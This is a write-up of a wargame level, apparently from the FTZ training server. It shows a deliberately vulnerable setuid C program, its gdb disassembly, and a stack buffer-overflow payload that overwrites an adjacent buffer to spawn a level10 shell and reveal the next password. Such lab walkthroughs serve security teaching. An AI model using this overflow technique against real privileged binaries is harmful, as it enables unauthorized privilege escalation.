#### Credential
```
level9 / apple
```

### Solution
```
[level9@ftz level9]$ ls
hint  public_html  tmp

[level9@ftz level9]$ cat hint 


다음은 /usr/bin/bof의 소스이다.

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
main(){
 
  char buf2[10];
  char buf[10];
 
  printf("It can be overflow : ");
  fgets(buf,40,stdin);
 
  if ( strncmp(buf2, "go", 2) == 0 )
   {
        printf("Good Skill!\n");
        setreuid( 3010, 3010 );
        system("/bin/bash");
   }
 
}   

이를 이용하여 level10의 권한을 얻어라.


[level9@ftz level9]$ cd tmp/

[level9@ftz tmp]$ cat > level9_solve.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
main(){
 
  char buf2[10];
  char buf[10];
 
  printf("It can be overflow : ");
  fgets(buf,40,stdin);
 
  if ( strncmp(buf2, "go", 2) == 0 )
   {
        printf("Good Skill!\n");
        setreuid( 3010, 3010 );
        system("/bin/bash");
   }
 
}   

[level9@ftz tmp]$ gcc -o level9_solve level9_solve.c

[level9@ftz tmp]$ ./level9_solve 
It can be overflow : 12345

[level9@ftz tmp]$ gdb ./level9_solve
GNU gdb Red Hat Linux (5.3post-0.20021129.18rh)
Copyright 2003 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux-gnu"...
(gdb) set disass intel
(gdb) disass main
Dump of assembler code for function main:
0x08048420 <main+0>:	push   ebp
0x08048421 <main+1>:	mov    ebp,esp
0x08048423 <main+3>:	sub    esp,0x28
0x08048426 <main+6>:	and    esp,0xfffffff0
0x08048429 <main+9>:	mov    eax,0x0
0x0804842e <main+14>:	sub    esp,eax
0x08048430 <main+16>:	sub    esp,0xc
0x08048433 <main+19>:	push   0x8048554
0x08048438 <main+24>:	call   0x8048350 <printf>
0x0804843d <main+29>:	add    esp,0x10
0x08048440 <main+32>:	sub    esp,0x4
0x08048443 <main+35>:	push   ds:0x8049698
0x08048449 <main+41>:	push   0x28
0x0804844b <main+43>:	lea    eax,[ebp-40]
0x0804844e <main+46>:	push   eax
0x0804844f <main+47>:	call   0x8048320 <fgets>
0x08048454 <main+52>:	add    esp,0x10
0x08048457 <main+55>:	sub    esp,0x4
0x0804845a <main+58>:	push   0x2
0x0804845c <main+60>:	push   0x804856a
0x08048461 <main+65>:	lea    eax,[ebp-24]
0x08048464 <main+68>:	push   eax
---Type <return> to continue, or q <return> to quit---
0x08048465 <main+69>:	call   0x8048330 <strncmp>
0x0804846a <main+74>:	add    esp,0x10
0x0804846d <main+77>:	test   eax,eax
0x0804846f <main+79>:	jne    0x80484a6 <main+134>
0x08048471 <main+81>:	sub    esp,0xc
0x08048474 <main+84>:	push   0x804856d
0x08048479 <main+89>:	call   0x8048350 <printf>
0x0804847e <main+94>:	add    esp,0x10
0x08048481 <main+97>:	sub    esp,0x8
0x08048484 <main+100>:	push   0xbc2
0x08048489 <main+105>:	push   0xbc2
0x0804848e <main+110>:	call   0x8048360 <setreuid>
0x08048493 <main+115>:	add    esp,0x10
0x08048496 <main+118>:	sub    esp,0xc
0x08048499 <main+121>:	push   0x804857a
0x0804849e <main+126>:	call   0x8048310 <system>
0x080484a3 <main+131>:	add    esp,0x10
0x080484a6 <main+134>:	leave  
0x080484a7 <main+135>:	ret    
End of assembler dump.
(gdb) quit

[level9@ftz tmp]$ (python -c 'print "A"*16+"go"';cat)|./level9_solve        
It can be overflow : Good Skill!
id
uid=3009(level9) gid=3009(level9) groups=3009(level9)

[level9@ftz tmp]$ (python -c 'print "A"*16+"go"';cat)|/usr/bin/bof 
It can be overflow : Good Skill!
id
uid=3010(level10) gid=3009(level9) groups=3009(level9)
my-pass
'xterm-256color': unknown terminal type.

Level10 Password is "interesting to hack!".
```
